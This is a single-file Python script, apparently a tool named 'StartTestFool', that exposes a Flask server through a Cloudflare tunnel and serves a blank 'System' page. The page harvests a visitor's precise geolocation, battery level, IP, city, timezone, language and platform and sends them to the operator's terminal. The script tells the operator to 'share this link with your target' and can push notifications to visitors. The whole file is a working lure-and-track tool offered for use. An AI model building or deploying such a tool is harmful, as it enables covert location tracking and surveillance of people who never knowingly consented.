
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# -*- StartTestFool | Single-File Terminal Web Panel | Qusoor -*-
# Usage: StartTestFool

import os, sys, json, time, threading, subprocess, socket, re, shutil
from datetime import datetime

# ---------- Self-install dependencies ----------
def ensure_deps():
    needed = ['flask', 'flask-cors', 'requests', 'colorama']
    missing = []
    for pkg in needed:
        try:
            __import__(pkg.replace('-', '_'))
        except ImportError:
            missing.append(pkg)
    if missing:
        print(f"[*] Installing missing packages: {missing}")
        subprocess.check_call([sys.executable, '-m', 'pip', 'install',
                               '--quiet', '--break-system-packages'] + missing)

ensure_deps()

from flask import Flask, request, jsonify, Response
from flask_cors import CORS
import requests
from colorama import init, Fore, Style
init(autoreset=True)

# ================== CONFIG ==================
PORT = 5000
HOME = os.path.expanduser("~")
CLOUDFLARED_LOCAL = os.path.join(HOME, ".local", "bin", "cloudflared")
# ============================================

app = Flask(__name__)
CORS(app)

VISITORS = {}
NOTIFICATIONS = []
PAGE_LOCK = threading.Lock()

# ---------- Helpers ----------
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def get_public_ip():
    try:
        return requests.get("https://api.ipify.org", timeout=5).text
    except:
        return "N/A"

def get_router_ip():
    try:
        result = subprocess.run(["ip", "route"], capture_output=True, text=True)
        for line in result.stdout.split("\n"):
            if line.startswith("default"):
                return line.split()[2]
    except:
        pass
    return "N/A"

def clear_screen():
    os.system("clear" if os.name != "nt" else "cls")

def banner():
    clear_screen()
    print(Fore.GREEN + Style.BRIGHT + r"""
  ____  _             _   _____         _   _____           _
 / ___|| |_ __ _ _ __| |_|_   _|__  ___| |_|  ___|__   ___ | |
 \___ \| __/ _` | '__| __| | |/ _ \/ __| __| |_ / _ \ / _ \| |
  ___) | || (_| | |  | |_  | |  __/\__ \ |_|  _| (_) | (_) | |
 |____/ \__\__,_|_|   \__| |_|\___||___/\__|_|  \___/ \___/|_|
       Terminal Web Panel  |  Cloudflare Tunnel  |  Qusoor
    """)
    print(Fore.CYAN + "=" * 70)
    print(Fore.YELLOW + f"[*] Server Public IP:  {get_public_ip()}")
    print(Fore.YELLOW + f"[*] Local IP:          {get_local_ip()}")
    print(Fore.YELLOW + f"[*] Router IP:         {get_router_ip()}")
    print(Fore.CYAN + "=" * 70)
    print(Fore.MAGENTA + "[*] Waiting for visitors...\n")

# ---------- Terminal input thread for notifications ----------
def notification_prompt_worker():
    handled = set()
    while True:
        with PAGE_LOCK:
            new = [vid for vid in VISITORS if vid not in handled]
        for vid in new:
            data = VISITORS[vid]
            print_visitor(data)
            try:
                ans = input(Fore.CYAN + "Do U want add notifications? [Y/N]: ").strip().lower()
                if ans == 'y':
                    txt = input(Fore.CYAN + "Notification text: ").strip()
                    if txt:
                        NOTIFICATIONS.append({
                            "visitor": vid,
                            "text": txt,
                            "time": datetime.now().isoformat()
                        })
                        print(Fore.GREEN + f"[+] Notification queued for {vid}: {txt}\n")
            except (EOFError, KeyboardInterrupt):
                pass
            handled.add(vid)
        time.sleep(1)

def print_visitor(data):
    print(Fore.GREEN + "┌" + "─" * 62)
    print(Fore.GREEN + f"│ New Visitor @ {datetime.now().strftime('%H:%M:%S')}")
    print(Fore.GREEN + "├" + "─" * 62)
    print(Fore.WHITE + f"│ IP:         {data.get('ip', 'N/A')}")
    print(Fore.WHITE + f"│ Battery:    {data.get('battery', 'N/A')}")
    print(Fore.WHITE + f"│ Latitude:   {data.get('latitude', 'N/A')}")
    print(Fore.WHITE + f"│ Country:    {data.get('country', 'N/A')}")
    print(Fore.WHITE + f"│ Public ip:  {data.get('public_ip', 'N/A')}")
    print(Fore.WHITE + f"│ Router Ip:  {data.get('router_ip', 'N/A')}")
    print(Fore.WHITE + f"│ Timezone:   {data.get('timezone', 'N/A')}")
    print(Fore.WHITE + f"│ Language:   {data.get('language', 'N/A')}")
    print(Fore.WHITE + f"│ Platform:   {data.get('platform', 'N/A')}")
    print(Fore.GREEN + "└" + "─" * 62)

# ---------- HTML page (inline) ----------
INDEX_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>System</title>
<style>
  body{background:#000;color:#0f0;font-family:monospace;padding:30px;}
  #s{font-size:16px;}
</style>
</head>
<body>
<div id="s">> Initializing...</div>
<script>
(async function(){
  const s=document.getElementById('s');
  const d={
    battery:"N/A",latitude:"N/A",longitude:"N/A",country:"N/A",
    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone||"N/A",
    language:navigator.language||"N/A",
    platform:navigator.platform||"N/A"
  };

  s.textContent="> Reading battery...";
  try{
    const b=await navigator.getBattery();
    d.battery=Math.round(b.level*100)+"% "+(b.charging?"(Charging)":"(Discharging)");
  }catch(e){}

  s.textContent="> Requesting location...";
  try{
    const p=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{timeout:8000}));
    d.latitude=p.coords.latitude;
    d.longitude=p.coords.longitude;
  }catch(e){ d.latitude="Denied/Unavailable"; }

  s.textContent="> Resolving country...";
  try{
    const r=await fetch('https://ipapi.co/json/');
    const j=await r.json();
    d.country=(j.country_name||'N/A')+' ('+(j.country_code||'??')+') - '+(j.city||'');
  }catch(e){}

  s.textContent="> Sending...";
  try{
    await fetch('/api/collect',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify(d)
    });
    s.textContent="> Done.";
  }catch(e){ s.textContent="> Error: "+e.message; }
})();
</script>
</body>
</html>
"""

# ---------- Routes ----------
@app.route('/')
def index():
    return Response(INDEX_HTML, mimetype='text/html')

@app.route('/api/collect', methods=['POST'])
def collect():
    try:
        data = request.get_json(force=True) or {}
        data['ip'] = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
        data['public_ip'] = get_public_ip()
        data['router_ip'] = get_router_ip()
        data['ua'] = request.headers.get('User-Agent', 'N/A')
        vid = f"v_{int(time.time()*1000)}"
        with PAGE_LOCK:
            VISITORS[vid] = data
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)}), 500

@app.route('/api/notifications/<vid>', methods=['GET'])
def get_notifications(vid):
    with PAGE_LOCK:
        result = [n for n in NOTIFICATIONS if n['visitor'] == vid or n['visitor'] == 'ALL']
    return jsonify(result)

@app.route('/api/broadcast', methods=['POST'])
def broadcast():
    d = request.get_json(force=True) or {}
    with PAGE_LOCK:
        NOTIFICATIONS.append({"visitor": "ALL", "text": d.get('text', ''), "time": datetime.now().isoformat()})
    return jsonify({"status": "ok"})

# ---------- Cloudflare Tunnel ----------
def ensure_cloudflared():
    """ينزّل cloudflared محلياً في ~/.local/bin بدون sudo"""
    # إذا موجود بالـ PATH أو بالمكان المحلي
    if shutil.which("cloudflared"):
        return shutil.which("cloudflared")
    if os.path.isfile(CLOUDFLARED_LOCAL) and os.access(CLOUDFLARED_LOCAL, os.X_OK):
        return CLOUDFLARED_LOCAL

    print(Fore.YELLOW + "[*] cloudflared not found. Downloading locally...")
    os.makedirs(os.path.dirname(CLOUDFLARED_LOCAL), exist_ok=True)

    # اكتشاف المعمارية
    machine = os.uname().machine
    if machine in ("x86_64", "amd64"):
        fname = "cloudflared-linux-amd64"
    elif machine in ("aarch64", "arm64"):
        fname = "cloudflared-linux-arm64"
    elif machine.startswith("arm"):
        fname = "cloudflared-linux-arm"
    else:
        fname = "cloudflared-linux-amd64"

    url = f"https://github.com/cloudflare/cloudflared/releases/latest/download/{fname}"
    try:
        r = requests.get(url, stream=True, timeout=120)
        r.raise_for_status()
        with open(CLOUDFLARED_LOCAL, "wb") as f:
            for chunk in r.iter_content(1024 * 64):
                f.write(chunk)
        os.chmod(CLOUDFLARED_LOCAL, 0o755)
        print(Fore.GREEN + f"[+] cloudflared saved to {CLOUDFLARED_LOCAL}")
        return CLOUDFLARED_LOCAL
    except Exception as e:
        print(Fore.RED + f"[!] Failed to download cloudflared: {e}")
        return None

def start_cloudflare_tunnel(binary):
    print(Fore.CYAN + "[*] Starting Cloudflare Tunnel...")
    proc = subprocess.Popen(
        [binary, "tunnel", "--url", f"http://localhost:{PORT}", "--no-autoupdate"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
    )
    url = None
    start = time.time()
    while time.time() - start < 60:
        line = proc.stdout.readline()
        if not line:
            if proc.poll() is not None:
                break
            continue
        m = re.search(r'https://[a-zA-Z0-9\-]+\.trycloudflare\.com', line)
        if m:
            url = m.group(0)
            break
    if url:
        print(Fore.GREEN + Style.BRIGHT + "\n" + "=" * 70)
        print(Fore.GREEN + f"[+] PUBLIC URL: {url}")
        print(Fore.GREEN + "=" * 70)
        print(Fore.YELLOW + "[*] Share this link with your target.\n")
    else:
        print(Fore.RED + "[!] Could not get public URL. Check cloudflared output.")
    return proc, url

# ---------- Flask in a thread ----------
def run_flask():
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False, threaded=True)

# ---------- Main ----------
def main():
    banner()

    binary = ensure_cloudflared()
    if not binary:
        sys.exit(1)

    # Flask thread
    threading.Thread(target=run_flask, daemon=True).start()
    time.sleep(2)

    # Terminal watcher thread
    threading.Thread(target=notification_prompt_worker, daemon=True).start()

    # Cloudflare Tunnel
    proc, _ = start_cloudflare_tunnel(binary)

    print(Fore.CYAN + "[*] Server running. Press Ctrl+C to stop.\n")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Shutting down...")
        try:
            proc.terminate()
        except:
            pass
        sys.exit(0)

if __name__ == "__main__":
    main()
